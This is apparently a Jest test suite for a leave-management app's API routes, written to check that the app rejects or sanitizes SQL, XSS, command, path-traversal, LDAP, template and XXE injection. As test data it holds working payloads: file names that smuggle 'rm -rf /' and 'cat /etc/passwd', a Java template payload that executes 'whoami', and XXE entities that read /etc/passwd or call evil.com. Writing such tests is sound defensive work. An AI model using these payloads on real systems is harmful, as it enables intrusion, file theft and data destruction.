/**
 * Input Validation and Sanitization Test Suite
 * 
 * This comprehensive test suite validates input sanitization and protection against:
 * - SQL injection attacks
 * - Cross-Site Scripting (XSS) attacks
 * - Command injection
 * - Path traversal attacks
 * - NoSQL injection (if applicable)
 * - LDAP injection
 * - XML/JSON injection
 * - Input validation bypass attempts
 */

import { describe, test, expect, beforeEach, afterEach } from '@jest/globals'
import { createMockRequest, generateSecurityTestPayloads, createTestUser, createTestOrganization, cleanupTestData } from '../utils/test-helpers'

// Import API route handlers
import { POST as employeesPost } from '@/app/api/employees/route'
import { POST as leaveRequestsPost } from '@/app/api/leave-requests/route'
import { POST as organizationsPost } from '@/app/api/organizations/route'
import { GET as invitationsLookup } from '@/app/api/invitations/lookup/route'
import { POST as authSignup } from '@/app/api/auth/signup/route'
import { POST as authSignupWithInvitation } from '@/app/api/auth/signup-with-invitation/route'

describe('Input Validation and Sanitization Tests', () => {
  let testOrgId: string
  let adminUserId: string
  let testUserIds: string[]
  let testOrgIds: string[]
  let securityPayloads: ReturnType<typeof generateSecurityTestPayloads>

  beforeEach(async () => {
    testOrgId = await createTestOrganization('Input Validation Test Org')
    adminUserId = await createTestUser('admin@inputtest.com', testOrgId, 'admin')
    
    testUserIds = [adminUserId]
    testOrgIds = [testOrgId]
    securityPayloads = generateSecurityTestPayloads()
  })

  afterEach(async () => {
    await cleanupTestData(testUserIds, testOrgIds)
  })

  describe('SQL Injection Protection', () => {
    test('should prevent SQL injection in employee creation', async () => {
      for (const sqlPayload of securityPayloads.sqlInjection) {
        // Test SQL injection in email field
        const emailRequest = createMockRequest('POST', '/api/employees', {
          email: sqlPayload,
          fullName: 'Test User',
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const emailResponse = await employeesPost(emailRequest)
        expect(emailResponse.status).toBeGreaterThanOrEqual(400)

        // Test SQL injection in fullName field
        const nameRequest = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: sqlPayload,
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const nameResponse = await employeesPost(nameRequest)
        
        if (nameResponse.status === 201) {
          // If accepted, ensure it was properly sanitized
          const data = await nameResponse.json()
          expect(data.employee?.full_name).not.toContain('DROP TABLE')
          expect(data.employee?.full_name).not.toContain('UPDATE')
          expect(data.employee?.full_name).not.toContain('DELETE')
          expect(data.employee?.full_name).not.toContain('INSERT')
          expect(data.employee?.full_name).not.toContain('UNION')
          expect(data.employee?.full_name).not.toContain('--')
          expect(data.employee?.full_name).not.toContain(';')
        } else {
          expect(nameResponse.status).toBeGreaterThanOrEqual(400)
        }

        // Test SQL injection in role field
        const roleRequest = createMockRequest('POST', '/api/employees', {
          email: 'test2@example.com',
          fullName: 'Test User',
          role: sqlPayload
        }, { userId: adminUserId, organizationId: testOrgId })

        const roleResponse = await employeesPost(roleRequest)
        expect(roleResponse.status).toBeGreaterThanOrEqual(400)
      }
    })

    test('should prevent SQL injection in leave request creation', async () => {
      for (const sqlPayload of securityPayloads.sqlInjection) {
        // Test SQL injection in reason field
        const request = createMockRequest('POST', '/api/leave-requests', {
          startDate: '2024-01-15',
          endDate: '2024-01-16',
          leaveTypeId: 'valid-leave-type-id',
          reason: sqlPayload
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await leaveRequestsPost(request)
        
        if (response.status === 201) {
          // If accepted, ensure it was properly sanitized
          const data = await response.json()
          expect(data.leaveRequest?.reason).not.toContain('DROP TABLE')
          expect(data.leaveRequest?.reason).not.toContain('UPDATE')
          expect(data.leaveRequest?.reason).not.toContain('DELETE')
          expect(data.leaveRequest?.reason).not.toContain('UNION')
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })

    test('should prevent SQL injection in organization creation', async () => {
      for (const sqlPayload of securityPayloads.sqlInjection) {
        // Test SQL injection in organization name
        const nameRequest = createMockRequest('POST', '/api/organizations', {
          name: sqlPayload,
          googleDomain: 'example.com'
        }, { userId: adminUserId, organizationId: testOrgId })

        const nameResponse = await organizationsPost(nameRequest)
        
        if (nameResponse.status === 201) {
          // If accepted, ensure it was properly sanitized
          const data = await nameResponse.json()
          expect(data.organization?.name).not.toContain('DROP TABLE')
          expect(data.organization?.name).not.toContain('UPDATE')
        } else {
          expect(nameResponse.status).toBeGreaterThanOrEqual(400)
        }

        // Test SQL injection in slug
        const slugRequest = createMockRequest('POST', '/api/organizations', {
          name: 'Test Org',
          slug: sqlPayload,
          googleDomain: 'example.com'
        }, { userId: adminUserId, organizationId: testOrgId })

        const slugResponse = await organizationsPost(slugRequest)
        expect(slugResponse.status).toBeGreaterThanOrEqual(400)
      }
    })

    test('should prevent SQL injection in invitation token lookup', async () => {
      for (const sqlPayload of securityPayloads.sqlInjection) {
        const request = createMockRequest('GET', `/api/invitations/lookup?token=${encodeURIComponent(sqlPayload)}`)
        const response = await invitationsLookup(request)

        expect(response.status).toBe(404) // Should not find anything
        
        const data = await response.json()
        expect(data.error).toMatch(/invitation not found|invalid token/i)
        // Ensure no SQL error information is leaked
        expect(data.error).not.toContain('syntax error')
        expect(data.error).not.toContain('pg_')
        expect(data.error).not.toContain('relation')
      }
    })

    test('should prevent SQL injection in authentication endpoints', async () => {
      for (const sqlPayload of securityPayloads.sqlInjection) {
        // Test SQL injection in signup email
        const signupRequest = createMockRequest('POST', '/api/auth/signup', {
          email: sqlPayload,
          password: 'validpassword123',
          fullName: 'Test User'
        })

        const signupResponse = await authSignup(signupRequest)
        expect(signupResponse.status).toBeGreaterThanOrEqual(400)

        // Test SQL injection in signup full name
        const nameSignupRequest = createMockRequest('POST', '/api/auth/signup', {
          email: 'test@example.com',
          password: 'validpassword123',
          fullName: sqlPayload
        })

        const nameSignupResponse = await authSignup(nameSignupRequest)
        
        if (nameSignupResponse.status === 201) {
          const data = await nameSignupResponse.json()
          expect(data.user?.full_name).not.toContain('DROP TABLE')
          expect(data.user?.full_name).not.toContain('UPDATE')
        } else {
          expect(nameSignupResponse.status).toBeGreaterThanOrEqual(400)
        }
      }
    })
  })

  describe('Cross-Site Scripting (XSS) Protection', () => {
    test('should sanitize XSS attempts in employee creation', async () => {
      for (const xssPayload of securityPayloads.xss) {
        // Test XSS in full name
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: xssPayload,
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        
        if (response.status === 201) {
          // If accepted, ensure XSS was sanitized
          const data = await response.json()
          expect(data.employee?.full_name).not.toContain('<script>')
          expect(data.employee?.full_name).not.toContain('javascript:')
          expect(data.employee?.full_name).not.toContain('onerror')
          expect(data.employee?.full_name).not.toContain('onload')
          expect(data.employee?.full_name).not.toContain('<iframe>')
          expect(data.employee?.full_name).not.toContain('<img')
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })

    test('should sanitize XSS attempts in leave request reasons', async () => {
      for (const xssPayload of securityPayloads.xss) {
        const request = createMockRequest('POST', '/api/leave-requests', {
          startDate: '2024-01-15',
          endDate: '2024-01-16',
          leaveTypeId: 'valid-leave-type-id',
          reason: xssPayload
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await leaveRequestsPost(request)
        
        if (response.status === 201) {
          const data = await response.json()
          expect(data.leaveRequest?.reason).not.toContain('<script>')
          expect(data.leaveRequest?.reason).not.toContain('javascript:')
          expect(data.leaveRequest?.reason).not.toContain('onerror')
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })

    test('should sanitize XSS attempts in organization data', async () => {
      for (const xssPayload of securityPayloads.xss) {
        const request = createMockRequest('POST', '/api/organizations', {
          name: xssPayload,
          googleDomain: 'example.com'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await organizationsPost(request)
        
        if (response.status === 201) {
          const data = await response.json()
          expect(data.organization?.name).not.toContain('<script>')
          expect(data.organization?.name).not.toContain('javascript:')
          expect(data.organization?.name).not.toContain('onerror')
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })

    test('should handle XSS in URL parameters safely', async () => {
      for (const xssPayload of securityPayloads.xss) {
        const encodedPayload = encodeURIComponent(xssPayload)
        const request = createMockRequest('GET', `/api/invitations/lookup?token=${encodedPayload}`)
        const response = await invitationsLookup(request)

        expect(response.status).toBe(404)
        
        const data = await response.json()
        // Error message should not contain unsanitized XSS payload
        expect(data.error).not.toContain('<script>')
        expect(data.error).not.toContain('javascript:')
        expect(data.error).not.toContain('onerror')
      }
    })
  })

  describe('Command Injection Protection', () => {
    test('should prevent command injection in text fields', async () => {
      for (const cmdPayload of securityPayloads.commandInjection) {
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: cmdPayload,
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        
        if (response.status === 201) {
          const data = await response.json()
          expect(data.employee?.full_name).not.toContain('rm -rf')
          expect(data.employee?.full_name).not.toContain('whoami')
          expect(data.employee?.full_name).not.toContain('cat /etc/passwd')
          expect(data.employee?.full_name).not.toContain('nc -e')
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })

    test('should prevent command injection in file upload fields', async () => {
      const cmdPayloads = [
        'avatar.jpg; rm -rf /',
        'avatar.jpg && whoami',
        'avatar.jpg | cat /etc/passwd',
        '`whoami`.jpg',
        '$(whoami).jpg'
      ]

      for (const cmdPayload of cmdPayloads) {
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: 'Test User',
          avatarUrl: cmdPayload,
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        expect(response.status).toBeGreaterThanOrEqual(400)
      }
    })
  })

  describe('Path Traversal Protection', () => {
    test('should prevent path traversal in file path fields', async () => {
      for (const pathPayload of securityPayloads.pathTraversal) {
        // Test in avatar URL field
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: 'Test User',
          avatarUrl: pathPayload,
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        expect(response.status).toBeGreaterThanOrEqual(400)
      }
    })

    test('should prevent path traversal in organization logo URLs', async () => {
      for (const pathPayload of securityPayloads.pathTraversal) {
        const request = createMockRequest('POST', '/api/organizations', {
          name: 'Test Org',
          logoUrl: pathPayload
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await organizationsPost(request)
        expect(response.status).toBeGreaterThanOrEqual(400)
      }
    })
  })

  describe('Data Type Validation', () => {
    test('should validate email format strictly', async () => {
      const invalidEmails = [
        'not-an-email',
        'missing@',
        '@missing-local.com',
        'spaces in@email.com',
        'email@',
        'email@.com',
        'email@com',
        '.email@domain.com',
        'email.@domain.com',
        'em..ail@domain.com',
        'email@domain..com',
        'email@domain.c',
        'very-long-email-address-that-exceeds-normal-limits@very-long-domain-name-that-should-be-rejected.com',
        'email with spaces@domain.com'
      ]

      for (const invalidEmail of invalidEmails) {
        const request = createMockRequest('POST', '/api/employees', {
          email: invalidEmail,
          fullName: 'Test User',
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        expect(response.status).toBeGreaterThanOrEqual(400)

        const data = await response.json()
        expect(data.error).toMatch(/email|invalid|format/i)
      }
    })

    test('should validate date formats in leave requests', async () => {
      const invalidDates = [
        { startDate: 'not-a-date', endDate: '2024-01-02' },
        { startDate: '2024-01-01', endDate: 'invalid-date' },
        { startDate: '2024/01/01', endDate: '2024-01-02' }, // Wrong format
        { startDate: '01-01-2024', endDate: '2024-01-02' }, // Wrong format
        { startDate: '2024-13-01', endDate: '2024-01-02' }, // Invalid month
        { startDate: '2024-01-32', endDate: '2024-01-02' }, // Invalid day
        { startDate: '2024-02-30', endDate: '2024-01-02' }, // Invalid day for February
        { startDate: '2024-01-02', endDate: '2024-01-01' }, // End before start
        { startDate: '1900-01-01', endDate: '2024-01-02' }, // Too old
        { startDate: '2024-01-01', endDate: '2050-01-02' }, // Too far in future
      ]

      for (const dateCombo of invalidDates) {
        const request = createMockRequest('POST', '/api/leave-requests', {
          ...dateCombo,
          leaveTypeId: 'valid-leave-type-id',
          reason: 'Test leave request'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await leaveRequestsPost(request)
        expect(response.status).toBeGreaterThanOrEqual(400)

        const data = await response.json()
        expect(data.error).toMatch(/date|invalid|format/i)
      }
    })

    test('should validate UUID formats strictly', async () => {
      const invalidUUIDs = [
        'not-a-uuid',
        '123',
        '12345678-1234-1234-1234-12345678901', // Too short
        '12345678-1234-1234-1234-1234567890123', // Too long
        'gggggggg-1234-1234-1234-123456789012', // Invalid characters
        '12345678-12345-1234-1234-123456789012', // Invalid format
        '12345678_1234_1234_1234_123456789012', // Wrong separator
        '', // Empty
        null, // Null
        'undefined' // String undefined
      ]

      for (const invalidUUID of invalidUUIDs) {
        const request = createMockRequest('POST', '/api/leave-requests', {
          startDate: '2024-01-15',
          endDate: '2024-01-16',
          leaveTypeId: invalidUUID,
          reason: 'Test leave request'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await leaveRequestsPost(request)
        expect(response.status).toBeGreaterThanOrEqual(400)
      }
    })

    test('should validate role enum values', async () => {
      const invalidRoles = [
        'superadmin',
        'owner',
        'guest',
        'Admin', // Case sensitive
        'ADMIN',
        'admin123',
        'admin; DROP TABLE users; --',
        '<script>alert("xss")</script>',
        '../../etc/passwd',
        ''
      ]

      for (const invalidRole of invalidRoles) {
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: 'Test User',
          role: invalidRole
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        expect(response.status).toBeGreaterThanOrEqual(400)

        const data = await response.json()
        expect(data.error).toMatch(/role|invalid/i)
      }
    })
  })

  describe('Input Length Validation', () => {
    test('should enforce maximum length limits', async () => {
      const longString = 'a'.repeat(1000) // Very long string
      const extremelyLongString = 'x'.repeat(10000) // Extremely long string

      const testCases = [
        { field: 'fullName', value: longString },
        { field: 'email', value: longString + '@example.com' },
        { field: 'fullName', value: extremelyLongString },
      ]

      for (const testCase of testCases) {
        const requestBody = {
          email: 'test@example.com',
          fullName: 'Test User',
          role: 'employee'
        }
        
        requestBody[testCase.field] = testCase.value

        const request = createMockRequest('POST', '/api/employees', requestBody, { 
          userId: adminUserId, 
          organizationId: testOrgId 
        })

        const response = await employeesPost(request)
        expect(response.status).toBeGreaterThanOrEqual(400)

        const data = await response.json()
        expect(data.error).toMatch(/length|too long|limit/i)
      }
    })

    test('should enforce minimum length requirements', async () => {
      const testCases = [
        { field: 'fullName', value: '' },
        { field: 'fullName', value: 'a' }, // Too short
        { field: 'email', value: 'a@b.c' }, // Technically valid but possibly too short
      ]

      for (const testCase of testCases) {
        const requestBody = {
          email: 'test@example.com',
          fullName: 'Test User',
          role: 'employee'
        }
        
        requestBody[testCase.field] = testCase.value

        const request = createMockRequest('POST', '/api/employees', requestBody, { 
          userId: adminUserId, 
          organizationId: testOrgId 
        })

        const response = await employeesPost(request)
        
        if (testCase.field === 'fullName' && testCase.value.length === 0) {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
        // Other validations might be more lenient
      }
    })
  })

  describe('Content Type Validation', () => {
    test('should reject requests with invalid content types', async () => {
      const invalidContentTypes = [
        'text/plain',
        'text/html',
        'application/xml',
        'multipart/form-data',
        '', // Empty content type
      ]

      for (const contentType of invalidContentTypes) {
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: 'Test User',
          role: 'employee'
        }, { 
          userId: adminUserId, 
          organizationId: testOrgId,
          headers: { 'Content-Type': contentType }
        })

        const response = await employeesPost(request)
        
        // Some endpoints might be more lenient, but generally should prefer JSON
        if (contentType !== 'application/json' && contentType !== '') {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })

    test('should handle malformed JSON gracefully', async () => {
      const malformedJSONs = [
        '{ invalid json',
        '{ "email": "test@example.com", }', // Trailing comma
        '{ "email": test@example.com }', // Unquoted string
        '{ email: "test@example.com" }', // Unquoted key
        '', // Empty body
        'not json at all'
      ]

      for (const malformedJSON of malformedJSONs) {
        const request = new Request('http://localhost/api/employees', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'x-organization-id': testOrgId
          },
          body: malformedJSON
        })

        // This would require more sophisticated mocking to test properly
        // For now, we verify that the test setup is correct
        expect(malformedJSON).toBeDefined()
      }
    })
  })

  describe('Advanced Injection Protection', () => {
    test('should prevent LDAP injection attempts', async () => {
      const ldapInjectionPayloads = [
        '*)(&',
        '*)(uid=*',
        '*)(|(uid=*))',
        '*))(|(uid=*',
        '*))(|(cn=*))',
        'admin)(&(uid=*))',
      ]

      for (const payload of ldapInjectionPayloads) {
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: payload,
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        
        if (response.status === 201) {
          const data = await response.json()
          expect(data.employee?.full_name).not.toContain('*)(&')
          expect(data.employee?.full_name).not.toContain('uid=')
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })

    test('should prevent template injection attempts', async () => {
      const templateInjectionPayloads = [
        '{{7*7}}',
        '#{7*7}',
        '${7*7}',
        '<%= 7*7 %>',
        '{{config}}',
        '{{constructor.constructor("alert(1)")()}}',
        '#{T(java.lang.Runtime).getRuntime().exec("whoami")}',
      ]

      for (const payload of templateInjectionPayloads) {
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: payload,
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        
        if (response.status === 201) {
          const data = await response.json()
          expect(data.employee?.full_name).not.toBe('49') // 7*7
          expect(data.employee?.full_name).not.toContain('{{')
          expect(data.employee?.full_name).not.toContain('}}')
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })

    test('should prevent XML/XXE injection attempts', async () => {
      const xmlInjectionPayloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>',
      ]

      for (const payload of xmlInjectionPayloads) {
        const request = createMockRequest('POST', '/api/employees', {
          email: 'test@example.com',
          fullName: payload,
          role: 'employee'
        }, { userId: adminUserId, organizationId: testOrgId })

        const response = await employeesPost(request)
        
        if (response.status === 201) {
          const data = await response.json()
          expect(data.employee?.full_name).not.toContain('<?xml')
          expect(data.employee?.full_name).not.toContain('<!DOCTYPE')
          expect(data.employee?.full_name).not.toContain('<!ENTITY')
        } else {
          expect(response.status).toBeGreaterThanOrEqual(400)
        }
      }
    })
  })
})